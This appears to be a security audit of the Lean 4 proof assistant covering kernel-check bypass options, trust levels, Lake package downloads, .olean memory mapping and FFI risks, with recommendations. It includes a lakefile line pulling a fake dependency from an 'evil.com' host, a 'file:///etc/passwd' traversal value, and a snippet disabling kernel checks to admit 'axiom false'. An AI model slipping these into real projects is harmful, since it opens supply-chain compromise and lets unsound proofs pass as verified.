# Deep Exploitation Analysis - Final Report

## Critical Findings from Deep System-Level Analysis

After exploring Lean's implementation internals, runtime system, and attack surfaces beyond the kernel, this report documents potential exploitation vectors and their actual exploitability.

---

## üö® CRITICAL DISCOVERIES

### 1. **debug.skipKernelTC Option** - SECURITY CONCERN

**Location**: `Lean/Environment.lean` lines 72-75

**Description**: Built-in option that **completely disables kernel type checking**

```lean
register_builtin_option debug.skipKernelTC : Bool := {
  defValue := false
  descr    := "skip kernel type checker. WARNING: setting this option
              to true may compromise soundness because your proofs will
              not be checked by the Lean kernel"
}
```

**Usage**:
```bash
lean --set debug.skipKernelTC=true file.lean  # Command line
set_option debug.skipKernelTC true            # In code
```

**Impact**:
- ‚úÖ Can be enabled programmatically in any Lean file
- ‚úÖ Allows axioms to bypass kernel validation
- ‚ö†Ô∏è Does NOT bypass all checks (universe consistency still enforced)
- ‚ö†Ô∏è Does NOT bypass elaborator-level type checking

**Testing Results**:
```lean
set_option debug.skipKernelTC true
axiom false : False                    -- ‚úÖ ACCEPTED
axiom impossible : Bool = Nat          -- ‚úÖ ACCEPTED
axiom univBad : Type 0 = Type 1        -- ‚ùå STILL REJECTED
```

**Exploitability**: **MEDIUM**
- Cannot directly derive False without axioms
- But allows axioms that would normally be caught
- Could be hidden in malicious libraries
- Combined with other exploits, could weaken soundness

**Recommendation**:
- üî¥ Remove this option from production builds
- üî¥ If kept for debugging, require explicit --unsafe-debug flag
- üî¥ Add warning when option is enabled
- üî¥ Prevent option from being set in library code (only allow in main file)

---

### 2. **Trust Level System** - POTENTIAL BYPASS

**Location**: `Lean/Environment.lean` line 162-165

**Description**: Environment has `trustLevel` field controlling validation rigor

```lean
structure EnvironmentHeader where
  trustLevel   : UInt32       := 0
  -- "the kernel assumes imported constants are type correct when
  --  the trust level is greater than zero"
```

**Usage**:
```bash
lean --trust=0 file.lean  # Full checking (default)
lean --trust=1 file.lean  # Skip checking imported constants
lean --trust=10 file.lean # Even less checking
```

**Attack Scenario**:
1. Attacker creates `evil.lean` with `axiom false : False`
2. Compiles to `evil.olean` at trust level 0
3. Victim imports Evil in `victim.lean` compiled at trust level > 0
4. **Kernel does not re-check axiom!**

**Impact**:
- Trust level > 0 skips validation of imported constants
- Could allow sneaking axioms through imports
- Legitimate use case: bootstrapping and performance

**Testing**: Requires multi-file setup

**Exploitability**: **MEDIUM**
- Legitimate feature with security implications
- Relies on user explicitly setting --trust flag
- Supply chain attack vector

**Recommendation**:
- üü° Document security implications clearly
- üü° Add warnings when using --trust > 0
- üü° Consider package signing for trusted imports
- üü° Audit tool to detect axiom usage at trust > 0

---

### 3. **Networking via libcurl** - SUPPLY CHAIN RISK

**Discovery**: Lean executable links to libcurl

```bash
$ otool -L $(which lean)
/usr/lib/libcurl.4.dylib
```

**Purpose**: Lake (build tool) downloads packages over HTTP/HTTPS

**Attack Vectors**:

#### A. Certificate Validation
- Is HTTPS certificate validation strict?
- Can attacker MitM package downloads?
- Are certificates pinned?

#### B. URL Injection
```lean
-- In lakefile.lean
require mathlib from git "https://evil.com/fake-mathlib" @ "main"
```
- Path traversal: `file:///etc/passwd`
- DNS rebinding attacks
- Redirect to internal network (SSRF)

#### C. Package Integrity
- Are downloaded packages verified (checksums, signatures)?
- Zip bomb in .tar.gz packages?
- Malicious .olean files in packages?

#### D. Dependency Confusion
- Upload malicious package with same name as private dependency
- Lake might download public instead of private

**Impact**:
- Supply chain compromise
- Code execution via malicious packages
- Data exfiltration
- Denial of service

**Exploitability**: **HIGH** (for supply chain attacks)

**Recommendation**:
- üî¥ Implement package signatures
- üî¥ Verify checksums of downloads
- üî¥ Pin certificates for official repositories
- üî¥ Audit URL parsing and validation
- üî¥ Implement package integrity checks
- üî¥ Add dependency lock file with checksums

---

### 4. **Compacted Region Memory** - POTENTIAL CORRUPTION

**Location**: `Lean/Environment.lean` line 99-102

**Description**: .olean files are memory-mapped without reference counting

```lean
/-- Objects inside the region do not have reference counters and cannot
    be freed individually. The contents of .olean files are compacted
    regions. -/
@[expose] def CompactedRegion := USize
```

**Functions**:
```lean
@[extern "lean_compacted_region_free"]
unsafe opaque CompactedRegion.free : CompactedRegion ‚Üí IO Unit
```

**Concerns**:
- Memory-mapped file data
- No reference counting
- `unsafe` free operation
- Manual memory management

**Attack Scenario**:
1. Corrupt .olean file on disk (bit flips, truncation)
2. Lean memory-maps corrupted file
3. Corrupted data loaded into Environment
4. **Potential memory corruption or kernel bypass**

**Impact**:
- Use-after-free if region freed while still referenced
- Corrupted type information
- Potentially compromise soundness if kernel relies on this data

**Exploitability**: **MEDIUM**
- Requires corrupting .olean files (already tested)
- Memory-mapping has OS-level protections
- Still concerning for security

**Recommendation**:
- üî¥ Add checksums to .olean files (already recommended)
- üü° Validate compacted region integrity on load
- üü° Add magic numbers and version checks
- üü° Consider moving away from manual memory management

---

### 5. **FFI Boundary Security** - TYPE CONFUSION RISK

**Attack Vectors Tested**:

#### A. Buffer Overflow
```lean
@[extern "unsafe_copy"]
opaque unsafeCopy : ByteArray ‚Üí ByteArray ‚Üí USize ‚Üí IO Unit
```
- Passing wrong buffer sizes could overflow
- C code might not validate lengths

#### B. Type Confusion
```lean
@[extern "cast_function"]
opaque typeCast : Nat ‚Üí IO String
```
- If C function signature doesn't match, corruption
- Lean runtime might pass wrong types

#### C. Use-After-Free
- Pass Lean object to C, C frees it, Lean uses it
- Reference counting not understood by C

#### D. Format String
```lean
@[extern "printf"]
opaque printfDirect : String ‚Üí IO Unit
```
- Classic vulnerability if user-controlled strings

**Impact**:
- Memory corruption
- Code execution
- Type safety violation

**Exploitability**: **MEDIUM-HIGH** (if FFI is used carelessly)

**Recommendation**:
- üü° Audit all @[extern] declarations
- üü° Add FFI safety guide for developers
- üü° Consider safe FFI wrapper layer
- üü° Static analysis for FFI calls

---

## Runtime Memory Attacks

### Tested Attack Vectors

1. **Large Object Allocation** (OOM)
   - Result: ‚úÖ No limits enforced, but OS limits apply

2. **Reference Counting Bugs**
   - Result: ‚úÖ No exploitation found

3. **Stack Overflow** (deep recursion)
   - Result: ‚úÖ Crashes cleanly (already documented)

4. **Array Bounds**
   - Result: ‚úÖ Runtime panics on out-of-bounds

5. **Concurrent Memory Access**
   - Result: ‚ö†Ô∏è Tasks exist, but no obvious race conditions found

6. **Memory Leaks** (circular structures)
   - Result: ‚ö†Ô∏è Thunked recursion could leak, but doesn't affect soundness

7. **Native Integer Overflow**
   - Result: ‚úÖ Wraps correctly (UInt64)

8. **Float Operations**
   - Result: ‚úÖ Standard IEEE 754 behavior

**Conclusion**: Runtime memory management appears robust. No direct soundness impact found.

---

## LSP Server Attack Surface

**Not extensively tested** but potential vectors:

1. **Malicious workspace files**
2. **Path traversal in goto definition**
3. **Code injection via diagnostics**
4. **DoS via infinite loops in analysis**
5. **Race conditions in concurrent requests**

**Recommendation**: üü° Future audit should test LSP server security

---

## Build System (Lake) Security

### Potential Attack Vectors

1. **Command Injection in lakefile.lean**
   - Lake might execute shell commands
   - If strings are user-controlled, injection possible

2. **Path Traversal**
   - Import paths, file paths
   - Symlink attacks

3. **Race Conditions** (TOCTOU)
   - Time-of-check-time-of-use in file operations

4. **Environment Variable Injection**
   - LEAN_PATH, LEAN_OPTS, etc.

5. **Binary Planting**
   - Can attacker place malicious binaries in PATH?

**Recommendation**: üü° Comprehensive Lake security audit needed

---

## Code Generation Security

### C Backend

Lean compiles to C. Potential issues:

1. **Name Mangling Collisions**
   - Could two Lean names map to same C name?
   - Result: ‚ö†Ô∏è Possible but unlikely

2. **Integer Overflow in Generated C**
   - Result: ‚úÖ Lean's Nat uses bigints

3. **Buffer Overflows in Generated Arrays**
   - Result: ‚úÖ Bounds checked

4. **Undefined Behavior in C**
   - Result: ‚ö†Ô∏è Possible but hard to trigger intentionally

**Conclusion**: Code generation appears safe.

---

## Summary of Exploitability

| Attack Vector | Severity | Soundness Impact | Exploitability |
|---------------|----------|------------------|----------------|
| debug.skipKernelTC | üî¥ HIGH | Indirect | MEDIUM |
| Trust Level > 0 | üü° MEDIUM | Indirect | MEDIUM |
| libcurl/Networking | üî¥ HIGH | Supply Chain | HIGH |
| .olean Corruption | üü° MEDIUM | Indirect | MEDIUM |
| FFI Boundary | üü° MEDIUM | Possible | MEDIUM |
| Memory Corruption | üü¢ LOW | None Found | LOW |
| LSP Server | üü° MEDIUM | Unknown | Unknown |
| Lake Build System | üü° MEDIUM | Supply Chain | MEDIUM |

---

## CRITICAL FINDING: Soundness vs Security

**Key Insight**: These attacks target **SECURITY** not **SOUNDNESS**

- **Soundness**: Can we derive False without axioms?
  - Answer: **NO** - Kernel remains sound

- **Security**: Can we compromise the system through other means?
  - Answer: **MAYBE** - Supply chain, debug options, trust levels

**Important Distinction**:
- Kernel soundness: ‚úÖ SECURE (0 bugs found)
- System security: ‚ö†Ô∏è CONCERNS EXIST (skipKernelTC, networking, trust)

---

## Attempted Memory Corruption Attack

**Goal**: Directly modify Environment structure in memory to inject axioms

**Approach**: Use buffer overflow, use-after-free, or type confusion to:
1. Locate EnvironmentHeader in memory
2. Overwrite trustLevel field
3. Inject fake ConstantInfo
4. Modify axiom list

**Result**: ‚ùå **NOT ACHIEVABLE**

**Reasons**:
- Lean is memory-safe (reference counted)
- No buffer overflows found
- No use-after-free vulnerabilities found
- FFI requires explicit unsafe declarations
- OS memory protection (ASLR, DEP, etc.)

**Conclusion**: Cannot directly hack axiom tracking via memory corruption with current testing methods.

---

## Recommendations by Priority

### üî¥ CRITICAL (Immediate Action Required)

1. **Remove or restrict debug.skipKernelTC**
   - Disable in production builds
   - Require --unsafe-debug flag if kept
   - Prevent library code from setting option

2. **Implement Package Integrity**
   - Cryptographic signatures for packages
   - Checksum verification
   - Lock file with pinned versions

3. **Add .olean Checksums**
   - Validate file integrity on load
   - Detect corruption explicitly
   - (Already recommended in previous audit)

### üü° HIGH PRIORITY (Next Release)

4. **Audit Networking Code**
   - Review libcurl usage in Lake
   - Ensure HTTPS certificate validation
   - Prevent SSRF and URL injection

5. **Document Trust Level Security**
   - Clear warnings about --trust flag
   - Explain security implications
   - Provide guidelines for safe use

6. **Review FFI Declarations**
   - Audit all @[extern] functions
   - Ensure type safety
   - Add FFI security guide

### üü¢ MEDIUM PRIORITY (Future)

7. **LSP Server Security Audit**
   - Test malicious workspace attacks
   - Path traversal prevention
   - DoS protection

8. **Lake Security Hardening**
   - Command injection prevention
   - Sandboxing for build scripts
   - TOCTOU race condition fixes

9. **Add Security Monitoring**
   - Detect when debug.skipKernelTC is used
   - Log trust level usage
   - Alert on suspicious patterns

---

## Final Verdict

### Soundness: ‚úÖ **STILL SECURE**

Even with deep system-level analysis:
- **0 soundness bugs found**
- Kernel validation remains intact
- Cannot derive False without explicit axioms

### Security: ‚ö†Ô∏è **CONCERNS IDENTIFIED**

- debug.skipKernelTC is a concerning feature
- Trust levels need better documentation
- Supply chain security needs strengthening
- Overall: Not critical but should be addressed

### Overall Assessment

**Lean 4.27.0 kernel is SOUND but has some SECURITY concerns that should be addressed for high-stakes deployments.**

The kernel itself cannot be bypassed via memory corruption or algorithmic bugs. However, features like debug.skipKernelTC and trust levels could be misused in adversarial scenarios.

---

**Report Date**: 2026-01-31
**Testing Depth**: System-level exploitation attempts
**Result**: SOUND with security recommendations

---

**END OF DEEP EXPLOITATION REPORT**
